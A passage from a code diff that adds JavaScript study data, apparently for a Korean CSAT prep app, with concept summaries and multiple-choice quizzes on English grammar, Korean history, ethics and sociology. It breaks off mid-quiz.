+            {
+              title: "도치와 강조",
+              content: `도치는 강조나 문장 구조 변화를 위해 어순을 바꾸는 표현이다. 부정어구가 문두에 올 때 조동사가 주어 앞에 위치하며, so, such, only 등의 강조 표현도 도치를 유발한다. 수능에서는 도치 구문을 정상 어순으로 바꾸어 의미를 파악하거나 문법 오류를 찾는 문제가 나온다.`
+            },
+            {
+              title: "시제 일치",
+              content: `시제 일치는 주절과 종속절의 시제가 논리적으로 일치하도록 하는 규칙이다. 과거 시제의 주절은 종속절에서 과거 또는 과거완료를 요구하며, 일반적 사실은 현재 시제를 유지하기도 한다. 수능에서는 시제 일치 규칙을 적용해 문장의 의미가 자연스럽도록 조정하는 문제가 자주 등장한다.`
+            },
+            {
+              title: "가주어·진주어",
+              content: `가주어는 문장의 주어 위치에 to부정사나 that절이 올 때 사용되는 it을 의미한다. 실제 주어인 진주어는 문장 뒤에 위치한다. 예를 들어 It is important to study는 to study가 진주어이다. 수능에서는 가주어 구문과 진주어 구문의 변환을 통해 문장 구조를 정확히 이해하는 문제가 출제된다.`
+            },
+            {
+              title: "준동사",
+              content: `준동사는 동사의 성격을 유지하면서 명사, 형용사, 부사 역할을 한다. to부정사는 명사·형용사·부사 역할이 가능하며, 동명사는 명사 역할, 분사는 형용사 역할을 한다. 수능에서는 준동사의 기능과 의미를 구분하고, 목적어로 사용할 수 있는지 여부를 판단하는 문제가 자주 출제된다.`
+            },
+            {
+              title: "관계부사",
+              content: `관계부사는 선행사를 수식하는 절을 이끄는 부사로, where, when, why 등이 대표적이다. 관계부사는 전치사+which로 대체할 수 있으며, 선행사가 장소, 시간, 이유 등을 나타낼 때 사용된다. 수능에서는 관계부사와 관계대명사의 차이를 구별하는 문제가 출제된다.`
+            },
+            {
+              title: "부정사와 동명사의 의미 차이",
+              content: `부정사와 동명사는 모두 동사 성격을 가진 명사 역할을 하지만 의미 차이가 있다. 부정사는 목적이나 계획, 미래 지향성을 나타내고, 동명사는 경험이나 완료된 행위를 나타내는 경우가 많다. 예를 들어 remember to do는 해야 할 일을 기억하는 것이고, remember doing은 했던 일을 기억하는 것이다. 수능에서는 이러한 의미 차이를 정확히 해석해야 한다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "관계대명사 who는 주로 어떤 선행사를 받는가?",
+              options: ["사물", "사람", "장소", "시간", "이유"],
+              answer: 1,
+              explanation: "who는 사람을 선행사로 받는 관계대명사이다."
+            },
+            {
+              q: "가정법 과거의 올바른 형태는?",
+              options: ["If + had p.p., would have p.p.", "If + 과거, would + 동사원형", "If + 현재, will + 동사", "If + 과거, will + 동사", "If + 현재완료, would have p.p."],
+              answer: 1,
+              explanation: "가정법 과거는 If + 과거, would + 동사원형 형태이다."
+            },
+            {
+              q: "분사 구문에서 주어가 다를 때 사용하는 구조는?",
+              options: ["일반 분사 구문", "독립분사구문", "부정사 구문", "명사절", "관계절"],
+              answer: 1,
+              explanation: "주어가 다를 때는 독립분사구문을 사용한다."
+            },
+            {
+              q: "병렬 구조가 맞는 문장은?",
+              options: ["He likes reading, to swim, and cycling.", "She enjoys reading, swimming, and cycling.", "They like read, to swim, and cycling.", "I like reading, swim, and to cycle.", "We enjoy to read, swimming, and cycling."],
+              answer: 1,
+              explanation: "병렬 구조는 같은 형태의 동명사를 나열한 문장이 맞다."
+            },
+            {
+              q: "부정어구가 문두에 올 때 발생하는 문법 현상은?",
+              options: ["도치", "강조", "생략", "축약", "동화"],
+              answer: 0,
+              explanation: "부정어구 문두 배치는 도치를 유발한다."
+            },
+            {
+              q: "가주어 문장에서 진주어 역할을 하는 것은?",
+              options: ["it", "to부정사나 that절", "주어 자리 명사", "부사", "전치사"],
+              answer: 1,
+              explanation: "진주어는 to부정사나 that절이다."
+            },
+            {
+              q: "준동사 중 명사 역할만 하는 것은?",
+              options: ["분사", "동명사", "to부정사(형용사)", "현재분사", "과거분사"],
+              answer: 1,
+              explanation: "동명사는 명사 역할만 한다."
+            },
+            {
+              q: "관계부사 where는 무엇을 선행사로 받는가?",
+              options: ["사람", "사물", "장소", "시간", "이유"],
+              answer: 2,
+              explanation: "where는 장소를 선행사로 받는 관계부사이다."
+            },
+            {
+              q: "remember to do의 의미로 옳은 것은?",
+              options: ["했던 일을 기억하다", "해야 할 일을 기억하다", "일을 후회하다", "일을 잊다", "일을 거부하다"],
+              answer: 1,
+              explanation: "remember to do는 해야 할 일을 기억하는 의미이다."
+            },
+            {
+              q: "시제 일치에 대한 설명으로 옳은 것은?",
+              options: ["주절이 과거여도 종속절은 항상 현재", "주절이 현재면 종속절은 과거", "주절이 과거면 종속절도 과거 또는 과거완료", "시제 일치는 필요 없다", "종속절은 항상 미래"],
+              answer: 2,
+              explanation: "주절이 과거일 때 종속절은 과거 또는 과거완료로 일치한다."
+            }
+          ]
+        }
+      },
+      "한국사": {
+        "전근대사": {
+          concepts: [
+            {
+              title: "선사 시대와 국가 형성",
+              content: `구석기 시대에는 이동 생활과 뗀석기 사용이 특징이며, 신석기 시대에는 농경과 목축, 간석기와 토기 사용이 나타난다. 청동기 시대에는 고인돌과 비파형 동검 등 권력의 분화가 나타나며, 철기 시대에는 세력의 확장과 국가 형성의 기반이 마련된다. 이러한 흐름은 고조선, 부여, 삼한 등 초기 국가의 탄생과 연결되며, 정치·사회 구조의 변화 과정을 이해해야 한다.`
+            },
+            {
+              title: "삼국의 성립과 발전",
+              content: `고구려, 백제, 신라는 각기 다른 지리적 특성과 문화적 기반을 바탕으로 성장했다. 고구려는 강력한 군사력과 광대한 영토, 백제는 해상 교역과 문화 교류, 신라는 화백회의와 화랑도로 대표되는 집단 지도 체제를 발전시켰다. 삼국은 중국과의 외교 관계 및 내부 정치 체제 변화를 통해 발전하며, 삼국 통일 과정의 배경을 형성한다.`
+            },
+            {
+              title: "통일 신라와 발해",
+              content: `신라는 삼국을 통일한 이후 중앙 집권 체제를 강화하고, 9주 5소경과 9서당 10정의 군사 제도를 확립했다. 발해는 고구려 계승 의식을 바탕으로 중국 당과 대등한 관계를 유지하며, 5경 15부 62주의 지방 제도를 운영했다. 두 나라의 관계와 문화적 특징을 비교하는 것은 수능에서 중요한 출제 요소이다.`
+            },
+            {
+              title: "고려의 통치 체제",
+              content: `고려는 문벌 귀족 사회를 기반으로 하면서도 중앙 집권 체제를 강화했다. 2성 6부 체제와 중추원, 어사대 등 다양한 관청이 운영되었으며, 지방에는 향리 제도가 존재했다. 무신 정변 이후에는 무신 정권과 몽골 침입이라는 격변을 겪었고, 공민왕의 개혁으로 왕권을 회복하려는 시도가 이루어졌다.`
+            },
+            {
+              title: "조선의 건국과 통치",
+              content: `조선은 성리학을 통치 이념으로 삼아 중앙 집권 체제를 강화했다. 6조 직계제와 의정부 서사제의 운영, 경국대전 편찬 등이 주요 특징이다. 지방에는 8도 체제와 수령 중심의 행정이 실시되었고, 향약과 서원, 향교를 통해 유교적 질서가 강화되었다. 조선의 통치 체제는 수능에서 반복 출제되는 핵심 내용이다.`
+            },
+            {
+              title: "조선 전기의 경제와 사회",
+              content: `조선 전기에는 농업 중심의 경제가 유지되었으며, 토지 제도로 과전법이 시행되었다. 농민층을 기반으로 한 신분 질서가 존재했으며, 양반, 중인, 상민, 천민 등으로 구분되었다. 공납과 군역 부담이 커지면서 사회적 모순이 발생했으며, 이러한 구조는 후기의 변동과 개혁의 배경이 된다.`
+            },
+            {
+              title: "조선 후기의 변화",
+              content: `조선 후기에는 대동법이 확대 시행되어 공납의 부담을 줄였고, 상업과 수공업이 발달하면서 장시와 사상 활동이 활발해졌다. 신분제는 동요하며 양반층이 증가했고, 실학이 등장하여 사회 개혁과 경제 발전을 주장했다. 수능에서는 대동법과 실학의 특징, 상업 발달의 영향 등을 종합적으로 이해해야 한다.`
+            },
+            {
+              title: "조선 후기 사회 문화",
+              content: `후기 사회에서는 서민 문화가 발달하며 판소리, 민화, 한글 소설이 확산되었다. 유교 질서가 유지되는 가운데서도 개인의 삶을 표현하는 문화가 성장했고, 실학자들은 실용적 학문을 강조했다. 수능에서는 후기 문화의 특징과 실학의 다양한 학자들의 주장(정약용, 박지원 등)을 비교하는 문제가 출제된다.`
+            },
+            {
+              title: "조선의 대외 관계",
+              content: `조선은 명과의 사대 관계 속에서 국제 질서를 유지했으며, 왜구와 여진에 대비하기 위한 국방 정책을 강화했다. 세종 대에는 4군 6진을 개척하여 북방을 안정시켰고, 임진왜란과 병자호란이라는 국난을 경험했다. 대외 관계의 변화는 국내 정치·경제에도 큰 영향을 미쳤다.`
+            },
+            {
+              title: "전통 사회의 교육과 문화",
+              content: `전통 사회에서는 서당, 향교, 성균관 등을 통해 유교 교육이 이루어졌다. 과거 제도는 관료 등용의 기본 수단이었으며, 성리학 중심의 학문이 강조되었다. 문화적으로는 금속활자와 한글 창제 등 독창적 업적이 있었으며, 수능에서는 교육 제도와 문화유산을 연결해 이해해야 한다.`
+            },
+            {
+              title: "성리학과 사회 질서",
+              content: `성리학은 조선 사회의 이념적 기반으로서 인간의 도덕성과 사회 질서를 강조한다. 예학은 가족과 사회의 규범을 확립하고, 신분제와 종법 질서를 정당화하는 역할을 했다. 그러나 성리학의 경직된 질서는 사회적 갈등을 유발하기도 했으며, 실학과 같은 새로운 사상적 흐름이 등장하는 배경이 되었다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "청동기 시대의 대표적 유물은?",
+              options: ["빗살무늬 토기", "비파형 동검", "돌도끼", "청자", "백자"],
+              answer: 1,
+              explanation: "비파형 동검은 청동기 시대의 대표적 유물이다."
+            },
+            {
+              q: "삼국 중 해상 교역과 문화 교류에 강한 나라는?",
+              options: ["고구려", "백제", "신라", "가야", "발해"],
+              answer: 1,
+              explanation: "백제는 해상 교역과 일본·중국과의 문화 교류가 활발했다."
+            },
+            {
+              q: "통일 신라의 지방 제도는?",
+              options: ["5경 15부", "9주 5소경", "8도 체제", "12목", "4군 6진"],
+              answer: 1,
+              explanation: "통일 신라는 9주 5소경 체제를 운영했다."
+            },
+            {
+              q: "고려의 중앙 정치 체제로 옳은 것은?",
+              options: ["6조 직계제", "2성 6부", "의정부 서사제", "집현전", "사간원"],
+              answer: 1,
+              explanation: "고려의 중앙 정치 체제는 2성 6부이다."
+            },
+            {
+              q: "조선 건국 이후 통치 이념은?",
+              options: ["불교", "도교", "성리학", "법가", "실학"],
+              answer: 2,
+              explanation: "조선은 성리학을 통치 이념으로 삼았다."
+            },
+            {
+              q: "조선 전기 토지 제도는?",
+              options: ["전시과", "과전법", "대동법", "균역법", "영정법"],
+              answer: 1,
+              explanation: "조선 전기는 과전법을 시행하였다."
+            },
+            {
+              q: "대동법의 목적은?",
+              options: ["군역 강화", "공납 부담 경감", "노비 확대", "세습 신분 강화", "왕권 약화"],
+              answer: 1,
+              explanation: "대동법은 공납 부담을 줄이기 위한 제도이다."
+            },
+            {
+              q: "임진왜란 이후 대외 관계 변화로 옳은 것은?",
+              options: ["조선은 해금 정책만 강화", "조선은 북방 영토 축소", "전쟁 후 국방 정책 강화", "외교 완전 단절", "조선은 명과 단절"],
+              answer: 2,
+              explanation: "임진왜란 이후 국방 정책이 강화되었다."
+            },
+            {
+              q: "전통 사회 교육 기관으로 옳지 않은 것은?",
+              options: ["서당", "향교", "성균관", "집현전", "학교"],
+              answer: 4,
+              explanation: "'학교'는 전통 교육 기관 명칭이 아니다."
+            },
+            {
+              q: "성리학이 강조한 가치로 옳은 것은?",
+              options: ["개인 자유", "상업 중심", "도덕과 예절", "군사 혁신", "무역 확대"],
+              answer: 2,
+              explanation: "성리학은 도덕과 예절을 강조했다."
+            }
+          ]
+        },
+        "근현대사": {
+          concepts: [
+            {
+              title: "흥선대원군의 개혁",
+              content: `흥선대원군은 왕권 강화를 위해 세도 정치의 폐단을 제거하고 경복궁 중건, 서원 철폐, 호포제 실시 등 개혁을 추진했다. 그의 정책은 내정 개혁과 통상 수교 거부 정책으로 요약되며, 이는 조선의 근대화를 지연시키는 측면도 있었으나 내부 질서를 바로잡는 역할도 했다. 수능에서는 개혁의 내용과 결과를 균형 있게 이해해야 한다.`
+            },
+            {
+              title: "개항과 근대화",
+              content: `1876년 강화도 조약으로 조선은 강제적으로 문호를 개방하였고, 이후 불평등 조약이 이어졌다. 개항 이후 개화 정책이 추진되었으나, 보수와 개화 세력 간 갈등이 심화되었다. 갑신정변과 동학농민운동, 갑오개혁 등의 사건은 근대화를 향한 과정에서 발생한 중요한 변동이며, 수능에서는 사건의 순서와 원인을 정확히 파악해야 한다.`
+            },
+            {
+              title: "일제의 침략과 식민 통치",
+              content: `일제는 1905년 을사늑약과 1910년 한일병합을 통해 한국을 식민지로 만들었다. 식민 통치 초기에는 무단 통치가 실시되었으며, 이후 문화 통치와 민족 말살 정책으로 변화했다. 수능에서는 토지 조사 사업, 산미 증식 계획 등 경제적 수탈 정책과 이에 대한 민족 운동의 전개를 종합적으로 이해해야 한다.`
+            },
+            {
+              title: "3·1 운동과 임시 정부",
+              content: `1919년 3·1 운동은 민족 자결주의를 바탕으로 전국적으로 확산된 독립 운동이었다. 이후 상하이에 대한민국 임시 정부가 수립되었고, 임시 정부는 민주 공화제 원칙을 표방했다. 수능에서는 3·1 운동의 배경과 의의를 설명하고, 임시 정부의 활동과 한계까지 파악해야 한다.`
+            },
+            {
+              title: "독립 운동의 전개",
+              content: `일제 강점기 독립 운동은 무장 투쟁, 외교 활동, 문화 운동 등 다양한 방식으로 전개되었다. 의열단의 무장 투쟁, 한인 애국단의 의거, 봉오동·청산리 전투는 대표적인 무력 항쟁 사례이며, 신간회와 같은 민족 협동 전선도 활동했다. 수능에서는 독립 운동의 시기별 특징과 조직을 정리하는 능력이 요구된다.`
+            },
+            {
+              title: "광복과 분단",
+              content: `1945년 광복 후 한국은 미·소 군정 체제 아래 분단되었고, 좌우 이념 대립이 심화되었다. 1948년 대한민국 정부 수립과 북한의 정권 수립으로 한반도는 분단이 고착화되었다. 수능에서는 분단 과정에서의 국제적 요인과 국내 정치적 갈등을 균형 있게 이해해야 한다.`
+            },
+            {
+              title: "한국 전쟁",
+              content: `1950년 발발한 한국 전쟁은 한반도 분단을 고착화시키고 막대한 인명 피해를 초래했다. 전쟁 과정에서 UN군의 참전, 중국군 개입, 휴전 협정 체결이 이루어졌다. 수능에서는 전쟁의 원인과 국제적 배경, 전후 복구 과정까지 종합적으로 이해해야 한다.`
+            },
+            {
+              title: "경제 개발과 산업화",
+              content: `1960~80년대 한국은 경제 개발 5개년 계획과 수출 주도형 산업화를 통해 급속한 경제 성장을 이루었다. 그러나 산업화 과정에서 노동 문제, 도시 집중, 환경 문제 등이 발생했으며, 수능에서는 경제 성장의 성과와 한계를 균형 있게 이해해야 한다.`
+            },
+            {
+              title: "민주화 운동",
+              content: `한국의 민주화 운동은 4·19 혁명, 5·18 민주화 운동, 6월 민주 항쟁 등으로 이어지며 정치적 변화를 이끌었다. 시민 사회의 참여와 인권 의식이 성장했고, 1987년 헌법 개정으로 직선제 개헌이 이루어졌다. 수능에서는 민주화 운동의 흐름과 사회적 의의를 파악해야 한다.`
+            },
+            {
+              title: "현대 한국 사회",
+              content: `1990년대 이후 한국은 세계화, 정보화, 남북 관계 변화 등 다양한 변화를 경험했다. IMF 외환 위기와 경제 구조 조정, 남북 정상회담 등은 현대사의 주요 사건이다. 수능에서는 현대 사회의 변화가 경제·정치·문화에 미친 영향을 종합적으로 이해하는 능력이 요구된다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "흥선대원군의 개혁 정책이 아닌 것은?",
+              options: ["서원 철폐", "호포제 실시", "경복궁 중건", "대동법 확대", "왕권 강화"],
+              answer: 3,
+              explanation: "대동법 확대는 이미 조선 후기의 정책이며 대원군의 주요 개혁은 아니다."
+            },
+            {
+              q: "강화도 조약의 성격은?",
+              options: ["대등한 조약", "불평등 조약", "군사 동맹", "중립 조약", "문화 교류"],
+              answer: 1,
+              explanation: "강화도 조약은 조선에 불리한 불평등 조약이다."
+            },
+            {
+              q: "일제의 무단 통치 시기 정책으로 옳은 것은?",
+              options: ["문화 통치", "헌병 경찰 제도", "자치 허용", "민족 교육 강화", "토지 반환"],
+              answer: 1,
+              explanation: "무단 통치 시기에는 헌병 경찰 제도가 시행되었다."
+            },
+            {
+              q: "3·1 운동의 결과로 옳은 것은?",
+              options: ["대한민국 임시 정부 수립", "독립 즉시 달성", "식민 통치 중단", "한일 병합", "한반도 분단"],
+              answer: 0,
+              explanation: "3·1 운동 이후 대한민국 임시 정부가 수립되었다."
+            },
+            {
+              q: "봉오동·청산리 전투는 어떤 성격의 운동인가?",
+              options: ["외교 활동", "문화 운동", "무장 독립 투쟁", "농민 운동", "경제 운동"],
+              answer: 2,
+              explanation: "봉오동·청산리 전투는 무장 독립 투쟁이다."
+            },
+            {
+              q: "한국 전쟁의 국제적 특징은?",
+              options: ["UN군 참전", "단독 전쟁", "유럽 전쟁", "중립 유지", "국제 개입 없음"],
+              answer: 0,
+              explanation: "한국 전쟁에는 UN군이 참전했다."
+            },
+            {
+              q: "경제 개발 5개년 계획의 목표는?",
+              options: ["농업만 강화", "수출 주도형 성장", "폐쇄 경제", "경제 축소", "소비 억제"],
+              answer: 1,
+              explanation: "경제 개발 5개년 계획은 수출 주도형 성장을 목표로 했다."
+            },
+            {
+              q: "6월 민주 항쟁의 결과로 옳은 것은?",
+              options: ["군사 정권 강화", "직선제 개헌", "경제 개발 중단", "외교 단절", "분단 심화"],
+              answer: 1,
+              explanation: "6월 민주 항쟁은 직선제 개헌으로 이어졌다."
+            },
+            {
+              q: "IMF 외환 위기의 영향으로 옳은 것은?",
+              options: ["경제 구조 조정", "전면 전쟁", "분단 해소", "군사 정권 강화", "식민 통치"],
+              answer: 0,
+              explanation: "IMF 위기 이후 구조 조정이 진행되었다."
+            },
+            {
+              q: "개항 이후 발생한 사건의 올바른 순서는?",
+              options: ["동학농민운동 → 갑오개혁 → 갑신정변", "갑신정변 → 동학농민운동 → 갑오개혁", "갑오개혁 → 동학농민운동 → 갑신정변", "갑신정변 → 갑오개혁 → 동학농민운동", "동학농민운동 → 갑신정변 → 갑오개혁"],
+              answer: 1,
+              explanation: "갑신정변(1884) → 동학농민운동(1894) → 갑오개혁(1894) 순서이다."
+            }
+          ]
+        }
+      },
+      "사회탐구": {
+        "생활과윤리": {
+          concepts: [
+            {
+              title: "윤리학의 기초",
+              content: `윤리학은 인간의 행위와 가치 판단의 기준을 탐구하는 학문이다. 규범 윤리학은 무엇이 옳은가를, 메타 윤리학은 윤리적 언어의 의미를, 응용 윤리학은 현실 문제의 적용을 다룬다. 수능에서는 기본적인 윤리 이론과 개념을 토대로 구체적 상황을 분석하는 능력이 요구된다.`
+            },
+            {
+              title: "공리주의",
+              content: `공리주의는 최대 행복의 원리를 강조하며, 행위의 결과가 도덕성을 결정한다고 본다. 벤담은 양적 공리주의, 밀은 질적 공리주의를 주장했다. 공리주의는 사회적 효용을 강조하지만 개인 권리 침해 가능성이라는 비판을 받는다. 수능에서는 공리주의의 장점과 한계, 다른 윤리 이론과의 비교가 중요하다.`
+            },
+            {
+              title: "의무론",
+              content: `칸트의 의무론은 결과가 아니라 행위의 동기와 보편적 법칙을 강조한다. 정언명령은 보편화 가능성과 인간 존엄성에 기반한다. 의무론은 인간을 수단이 아닌 목적으로 대우해야 한다는 점에서 인권 강조의 이론적 근거를 제공하지만, 상황에 따른 유연성이 부족하다는 비판도 있다.`
+            },
+            {
+              title: "덕 윤리",
+              content: `덕 윤리는 인간의 품성과 습관을 중시하며, 아리스토텔레스의 중용 사상이 대표적이다. 덕은 이성에 따른 선택을 통해 습관화되며, 과도함과 부족함 사이의 균형을 의미한다. 수능에서는 덕 윤리의 특징과 타 윤리 이론과의 차이를 비교하는 문제가 출제된다.`
+            },
+            {
+              title: "자유와 책임",
+              content: `자유는 자기 결정의 가능성을 의미하며, 책임과 불가분의 관계에 있다. 자유가 확대될수록 책임의 범위도 커지며, 사회적 규범과 법은 자유와 책임의 균형을 유지하기 위해 존재한다. 수능에서는 자유의 조건과 한계를 분석하고, 책임 윤리와 연결해 이해하는 문제를 다룬다.`
+            },
+            {
+              title: "정의와 분배",
+              content: `정의는 사회적 자원을 공정하게 분배하는 원리이며, 롤스의 정의론은 무지의 베일과 차등 원칙을 강조한다. 이는 사회적 약자를 배려하는 분배 정의를 추구하며, 자유주의와 평등주의의 균형을 모색한다. 수능에서는 정의론의 핵심 개념과 다른 분배 이론의 차이를 이해해야 한다.`
+            },
+            {
+              title: "생명 윤리",
+              content: `생명 윤리는 인간 생명의 시작과 끝, 의료 기술의 적용 범위를 다루는 윤리 분야다. 낙태, 안락사, 장기 이식 등의 문제에서 개인의 자기 결정권과 생명 존엄성 사이의 균형을 고민해야 한다. 수능에서는 찬반 논거를 분석하고 윤리적 판단 기준을 제시하는 능력이 요구된다.`
+            },
+            {
+              title: "환경 윤리",
+              content: `환경 윤리는 인간과 자연의 관계를 윤리적으로 재정립하는 이론이다. 인간 중심주의는 자연을 수단으로 보지만, 생태 중심주의는 자연 자체의 가치를 인정한다. 지속 가능성은 현재 세대의 욕구와 미래 세대의 권리를 고려하는 개념이며, 수능에서는 환경 윤리의 관점을 비교하는 문제가 출제된다.`
+            },
+            {
+              title: "정보 윤리",
+              content: `정보 윤리는 디지털 사회에서 개인정보 보호, 지식 재산권, 사이버 폭력 등의 문제를 다룬다. 정보의 공유와 자유는 중요하지만, 개인 권리 보호와 균형을 이루어야 한다. 수능에서는 정보 윤리의 사례를 분석하고, 책임 있는 정보 활용의 원칙을 적용하는 능력이 요구된다.`
+            },
+            {
+              title: "직업과 윤리",
+              content: `직업 윤리는 전문직의 사회적 책임과 윤리적 기준을 강조한다. 의료, 법률, 교육 등 각 분야에서 신뢰와 공공성이 중요하며, 이해 상충을 방지하고 공정성을 유지해야 한다. 수능에서는 직업 윤리의 중요성과 사회적 역할을 사례 중심으로 이해하는 문제가 나온다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "공리주의의 핵심 원리는?",
+              options: ["의무 준수", "최대 행복", "덕의 습관화", "무지의 베일", "자유 의지"],
+              answer: 1,
+              explanation: "공리주의는 최대 행복의 원리를 강조한다."
+            },
+            {
+              q: "칸트 윤리에서 정언명령의 의미는?",
+              options: ["상황에 따라 달라짐", "보편적 법칙", "결과 중심", "감정 중심", "편의 중심"],
+              answer: 1,
+              explanation: "정언명령은 보편화 가능한 도덕 법칙을 의미한다."
+            },
+            {
+              q: "덕 윤리의 핵심 개념은?",
+              options: ["최대 행복", "보편적 법칙", "중용", "계약", "합의"],
+              answer: 2,
+              explanation: "덕 윤리는 중용과 품성의 함양을 강조한다."
+            },
+            {
+              q: "롤스의 정의론에서 강조하는 원칙은?",
+              options: ["자연 상태", "차등 원칙", "사회 계약", "절대 자유", "전통"],
+              answer: 1,
+              explanation: "롤스는 차등 원칙을 통해 약자를 배려한다."
+            },
+            {
+              q: "생명 윤리에서 다루는 문제는?",
+              options: ["경제 성장", "안락사", "문화 교류", "행정 제도", "환경 보호"],
+              answer: 1,
+              explanation: "안락사는 생명 윤리의 대표적 쟁점이다."
+            },
+            {
+              q: "환경 윤리에서 생태 중심주의의 특징은?",
+              options: ["자연은 도구", "자연 자체의 가치 인정", "인간만 가치", "경제 성장 우선", "법적 가치만 인정"],
+              answer: 1,
+              explanation: "생태 중심주의는 자연의 고유 가치를 인정한다."
+            },
+            {
+              q: "정보 윤리의 주요 이슈로 알맞은 것은?",
+              options: ["문자 해독", "개인정보 보호", "국경 분쟁", "세금 제도", "농업 기술"],
+              answer: 1,
+              explanation: "정보 윤리는 개인정보 보호와 관련이 깊다."
+            },
+            {
+              q: "직업 윤리에서 강조하는 요소는?",
+              options: ["개인 이익", "사회적 신뢰", "감정 표현", "사적 거래", "무책임"],
+              answer: 1,
+              explanation: "직업 윤리는 사회적 신뢰와 공공성을 강조한다."
+            },
+            {
+              q: "자유와 책임의 관계로 옳은 것은?",
+              options: ["자유와 책임은 무관", "자유가 커질수록 책임 확대", "책임은 자유를 제한", "책임은 존재하지 않음", "자유는 항상 절대"],
+              answer: 1,
+              explanation: "자유가 확대되면 책임도 함께 확대된다."
+            },
+            {
+              q: "윤리학의 한 분야로 옳지 않은 것은?",
+              options: ["규범 윤리학", "메타 윤리학", "응용 윤리학", "기술 윤리학", "윤리학은 모두"],
+              answer: 4,
+              explanation: "윤리학은 규범, 메타, 응용 윤리학으로 구분된다. '윤리학은 모두'는 선택지로 부적절하다."
+            }
+          ]
+        },
+        "사회문화": {
+          concepts: [
+            {
+              title: "사회화와 인간",
+              content: `사회화는 개인이 사회의 규범과 문화를 내면화하는 과정이다. 1차 사회화는 가족에서 이루어지고, 2차 사회화는 학교, 또래 집단, 직장 등에서 진행된다. 사회화는 개인 정체성과 사회 질서를 유지하는 데 핵심 역할을 하며, 수능에서는 사회화의 기능과 기관의 역할을 분석하는 문제가 출제된다.`
+            },
+            {
+              title: "문화의 속성",
+              content: `문화는 공유성, 학습성, 전체성, 변동성, 상대성 등의 속성을 가진다. 문화는 사회 구성원들이 공유하는 생활 양식이며 학습을 통해 습득된다. 문화의 상대성은 각 문화가 고유한 가치 체계를 가지고 있다는 의미이며, 이는 문화 다양성을 이해하는 데 중요하다. 수능에서는 문화 속성을 구체적 사례로 적용하는 문제가 나온다.`
+            },
+            {
+              title: "사회 구조와 계층",
+              content: `사회 구조는 사회 구성 요소 간의 관계를 의미하며, 계층 구조는 사회적 자원 분배의 불평등을 나타낸다. 계층 이동은 개인의 노력과 사회 구조적 요인에 의해 결정되며, 수직 이동과 수평 이동으로 구분된다. 수능에서는 계층 이동의 유형과 계층 구조가 사회에 미치는 영향을 분석해야 한다.`
+            },
+            {
+              title: "사회 집단과 조직",
+              content: `사회 집단은 공동 목표와 상호 작용을 기반으로 형성된다. 1차 집단은 친밀한 관계를, 2차 집단은 목적 중심의 관계를 특징으로 한다. 조직은 규범과 역할이 분화된 집단이며, 관료제는 효율성과 전문성을 강조한다. 수능에서는 집단 유형과 조직의 특성을 비교하는 문제가 출제된다.`
+            },
+            {
+              title: "일탈과 사회 통제",
+              content: `일탈은 사회 규범을 위반하는 행동이며, 사회 통제는 일탈을 억제하고 규범을 유지하는 과정이다. 일탈 이론에는 머튼의 아노미 이론, 낙인 이론 등이 있으며, 사회 통제는 공식적 통제와 비공식적 통제로 구분된다. 수능에서는 일탈 원인과 통제 방식의 효과를 분석하는 문제가 나온다.`
+            },
+            {
+              title: "사회 변동",
+              content: `사회 변동은 기술, 경제, 정치, 문화 요인에 의해 발생한다. 산업화, 도시화, 정보화는 사회 구조와 가치관을 변화시키며, 이러한 변화는 갈등과 새로운 사회 문제를 동반한다. 수능에서는 사회 변동의 원인과 결과, 그리고 이에 대한 사회적 대응을 이해하는 문제가 출제된다.`
+            },
+            {
+              title: "대중 매체와 여론",
+              content: `대중 매체는 정보 전달과 여론 형성에 중요한 역할을 한다. 매체는 의제 설정 기능을 통해 사회적 관심사를 결정하며, 여론은 사회 구성원들의 의견 집합으로 정책 결정에 영향을 미친다. 수능에서는 매체의 긍정적 기능과 부정적 영향, 여론 형성 과정에 대한 이해가 요구된다.`
+            },
+            {
+              title: "사회 조사 방법",
+              content: `사회 조사는 사회 현상을 과학적으로 이해하기 위한 방법으로, 설문 조사, 면접 조사, 참여 관찰 등이 있다. 표본 추출의 대표성, 타당도, 신뢰도를 확보해야 하며, 윤리적 고려도 중요하다. 수능에서는 조사 방법의 특징과 한계를 비교하는 문제가 출제된다.`
+            },
+            {
+              title: "문화 변동과 세계화",
+              content: `세계화는 문화 교류를 확대하지만 문화 동질화와 문화 충돌을 동시에 유발할 수 있다. 문화 변동은 외재적 변동과 내재적 변동으로 구분되며, 대중문화와 소비문화의 확산은 사회적 가치관 변화에 영향을 준다. 수능에서는 세계화의 긍정적·부정적 효과를 균형 있게 이해해야 한다.`
+            },
+            {
+              title: "사회 불평등",
+              content: `사회 불평등은 소득, 교육, 직업, 권력 등 다양한 영역에서 나타난다. 불평등은 개인의 능력뿐 아니라 사회 구조적 요인에 의해 결정되며, 불평등의 완화는 사회 정책의 중요한 목표다. 수능에서는 사회 불평등의 원인과 해결 방안을 분석하는 문제가 출제된다.`
+            }
+          ],
+          quizzes: [
+            {
+              q: "1차 사회화가 주로 이루어지는 기관은?",
+              options: ["직장", "가족", "국가", "학교", "언론"],
+              answer: 1,
+              explanation: "1차 사회화는 가족에서 주로 이루어진다."
+            },
+            {
+              q: "문화의 속성 중 '상대성'의 의미는?",
+              options: ["모든 문화는 동일", "문화는 변하지 않음", "각 문화는 고유 가치", "문화는 유전됨", "문화는 개인 것"],
+              answer: 2,
+              explanation: "문화 상대성은 각 문화가 고유한 가치 체계를 가진다는 의미다."
+            },
+            {
+              q: "계층 이동의 유형 중 수직 이동은?",
+              options: ["직업 변경", "지위 상승 또는 하락", "지역 이동", "친구 변경", "문화 변동"],
+              answer: 1,
+              explanation: "수직 이동은 지위가 상승하거나 하락하는 이동이다."
+            },
+            {
+              q: "1차 집단의 특징은?",
+              options: ["목적 중심", "형식적 관계", "친밀한 관계", "규칙 중심", "일시적"],
+              answer: 2,
+              explanation: "1차 집단은 친밀한 관계를 특징으로 한다."
+            },
+            {
+              q: "머튼의 아노미 이론은 무엇을 설명하는가?",
+              options: ["문화 확산", "일탈 행위의 원인", "사회 조사", "대중 매체", "관료제"],
+              answer: 1,
+              explanation: "아노미 이론은 사회 구조와 문화 목표 불일치로 인한 일탈을 설명한다."
+            },
+            {
+              q: "산업화로 인한 사회 변동으로 옳은 것은?",
+              options: ["도시화", "자급자족 확대", "가족 규모 증가", "농촌 중심화", "정치 안정"],
+              answer: 0,
+              explanation: "산업화는 도시화를 촉진한다."
+            },
+            {
+              q: "대중 매체의 의제 설정 기능은 무엇을 의미하는가?",
